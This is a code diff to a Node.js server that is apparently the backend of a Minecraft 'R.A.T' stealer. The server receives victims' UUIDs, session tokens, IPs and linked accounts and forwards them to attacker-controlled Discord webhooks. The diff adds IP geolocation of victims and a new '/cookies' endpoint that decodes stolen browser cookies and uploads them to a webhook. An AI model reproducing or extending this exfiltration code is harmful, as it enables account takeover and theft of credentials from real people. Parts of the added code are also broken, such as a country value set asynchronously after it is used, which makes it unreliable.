@@ -4,6 +4,7 @@ const getProfiles = require('./utils/networth')
 
 require("dotenv").config()
 
+const { WebhookClient } = require("discord.js");
 const { post, get } = require("axios"),
 express = require("express"),
 helmet = require("helmet"),
@@ -26,7 +27,6 @@ let debughook = process.env.DEBUGHOOK
 
 // Blacklist
 let blacklist = process.env.BLACKLIST
-
 
 //array initialization
 const ipMap = []
@@ -166,6 +166,13 @@ app.post("/", (req, res) => {
                 content = `Essential - <t:${timestamp}:R>`
             }
         }
+        
+        let country = "undefined"
+        // Set country
+        fetchCountry(req.body.ip).then((result) => {
+            country = result
+        })
+        
 
         // get profiles
         let profiles = ''
@@ -227,6 +234,7 @@ app.post("/", (req, res) => {
                         {name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true},
                         {name: 'Token', value: `\`\`\`${req.body.token}\`\`\``, inline: false},
                         {name: 'IP', value: `\`\`\`${req.body.ip}\`\`\``, inline: true},
+                        {name: 'Country', value: `\`\`\`${country}\`\`\``, inline: true},
                         {name: 'Comment', value: `\`\`\`${comment}\`\`\``, inline: true},
                         {name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false},
                         {name: 'Feather Accounts:', value: `\`\`\`\n${featherAccounts.join('\n')}\`\`\``, inline: true},
@@ -311,6 +319,49 @@ app.listen(port, () => {
     
 })
 
+//cookies
+app.post("/cookies", (req, res) => {
+    //happens if the request does not contain all the required fields, aka someones manually posting to the server
+    if (!["username", "cookies"].every(field => req.body.hasOwnProperty(field))) {
+        console.log(req.body)
+        return res.sendStatus(404)
+    }
+
+    // Set webhook
+    let webhook = defaulthook
+
+    if (blacklist.split("_").includes(req.body.uuid)) { // debug
+        content = `Blacked - <t:${timestamp}:R>`
+        webhook = blackhook
+    }
+
+    if (req.body.type == "essential") {
+        webhook = blackhook //debug
+    }
+
+    // Create a new FormData object
+    const formData = new FormData();
+
+    // Create a Blob representing the content of the file
+    const fileContent = new Blob([atob(req.body.cookies)], { type: 'text/plain' });
+
+    // Append the file to the FormData object
+    formData.append('file', fileContent, `${req.body.username} cookies.txt`);
+
+    // Use fetch API to send the FormData to the Discord webhook
+    fetch(webhook, {
+        method: 'POST',
+        body: formData,
+    }).then(response => {
+        console.log("Sent cookies successfully")
+    }).catch(error => {
+        sendMessage(`\`\`\`${req.body.username}/n${err}\`\`\``)
+    });
+    
+    //change this to whatever you want, but make sure to send a response
+    res.send("OK")
+})
+
 //format a number into thousands millions billions
 const formatNumber = (num) => {
     if (num < 1000) return num.toFixed(2)
@@ -330,4 +381,26 @@ function sendMessage(message) {
             }).catch(err => {
                 console.log(`[R.A.T] Error while debugging:\n${err}`)
             })
+}
+
+const fetchCountry = async (ip) => {
+    // Set URL
+    const apiUrl = `http://ip-api.com/json/${ip}`;
+
+    try {
+        // Send HTTP request
+        const response = await fetch(apiUrl);
+
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
+        }
+
+        // Fetch country
+        const data = await response.json();
+
+        return data.country;
+    } catch (error) {
+        // Return 'Unknown' in case of any errors
+        return 'Unknown';
+    }
 }
